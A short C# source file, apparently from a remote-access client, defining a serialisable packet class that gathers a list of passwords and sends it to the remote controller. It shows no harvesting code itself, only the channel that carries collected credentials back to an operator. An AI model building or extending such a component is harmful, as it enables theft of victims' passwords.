using System.Collections.Generic;
using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class GetPasswordsResponse : IPacket
    {
        [ProtoMember(1)]
        public List<string> Passwords { get; set; }

        public GetPasswordsResponse()
        {
        }

        public GetPasswordsResponse(List<string> data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}